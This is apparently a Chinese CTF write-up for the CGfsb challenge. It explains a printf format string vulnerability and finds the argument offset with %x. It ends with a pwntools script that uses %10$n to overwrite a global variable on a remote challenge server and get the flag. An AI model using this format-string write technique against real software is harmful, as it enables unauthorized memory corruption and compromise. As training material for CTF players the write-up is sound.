# [攻防世界]新手区CGfsb

依旧是先放到linux里扫一下，看看文件属性及开启的保护措施  
![checksec\~checksec\~checksec~](https://sphandsomejack.github.io/2020/02/08/CGfsb/a.png)  
开了canary和nx，即没法直接覆盖返回地址和使用shellcode，题目里提示了prinf的作用，可以着重看看prinf  
用32位IDA打开，既有system，也有cat flag

![](https://sphandsomejack.github.io/2020/02/08/CGfsb/b.png)  
再看主函数的伪代码  
![](https://sphandsomejack.github.io/2020/02/08/CGfsb/c.png)  
这个程序流程就是让你输入你的名字和要留下的信息，它就会说你好，并用printf输出你留下的信息。如果pwnme的值为8，那么判断成立就会直接执行system(“cat flag”)拿到flag，否则输出Thank you  
![](https://sphandsomejack.github.io/2020/02/08/CGfsb/d.png)  
第23行的这个printf不是正确的用法，会产生格式化字符串漏洞  
printf正确用法是printf(“格式化字符串，……” , 参量，……)，比如输出一个字符串a应该用printf(“%s”,a)，但**如果写成了printf(a),就会出现格式化字符串漏洞，如果a是”%x”，那么printf(a)就会输出它后面的内存中的数据**。  
![](https://sphandsomejack.github.io/2020/02/08/CGfsb/e.png)  
61即 ‘a’ 的ASCII码，61616161即为 ‘aaaa’，可以看到输入的 ‘aaaa’ 偏移了10位，如果你不确定自己数的对不对，可以验证一下，用 ‘%10$x’ ，这个可以直接查看第十位的数据  
![](https://sphandsomejack.github.io/2020/02/08/CGfsb/f.png)  
偏移的确是10，所以输出的也是61616161  
格式化字符串中，有一个%n比较特殊，**%n可以将它前面已打印的字符个数赋值给后面它对应的参数**，也许看起来有点绕口。。。举个栗子↓↓

> 来自于[stack overflow](https://stackoverflow.com/questions/3401156/what-is-the-use-of-the-n-format-specifier-in-c)  
> #include <stdio.h>  
> int main(){  
> int val;  
> printf(“blah %n blah\n”, &val);  
> printf(“val = %d\n”, val);  
> return 0;  
> }  
> output:  
> blah blah  
> val = 5

%n前的字符个数为5，所以将5赋值给了val。但是好像Windows上不让用%n赋值….所以别再Windows下试了

## [](https://sphandsomejack.github.io/2020/02/08/CGfsb/#%E6%80%9D%E8%B7%AF%EF%BC%9A "思路：")思路：

1. 第一次运行程序，name随便输，在输入message时利用%x计算输入位置偏移
2. 第二次运行程序，name随便输，在输入message时，先输入pwnme的地址
3. 利用 _%偏移$n_ 改变pwnme的值为8
4. 拿到flag
exp：
```python
from pwn import *  
  
payload = p32(0x0804A068) + b'aaaa%10$n'  
  
p = remote('61.147.171.105',55192)  
p.sendlineafter('tell me your name:','abcd')  
p.sendlineafter('your message please:',payload)  
p.interactive()
```
payload解释：

1. p32(0x0804A068)：pwnme的地址，双击pwnme即可查看
2. ‘aaaa%10$n’：p32打包后的数据是4位的，但是要赋值8给pwnme，所以再填充4个a，然后把8赋值给第十个参数，即pwnme的地址对应的值

关于格式化字符串漏洞的原理，可以看看[这篇文章](https://blog.csdn.net/qq_43394612/article/details/84900668)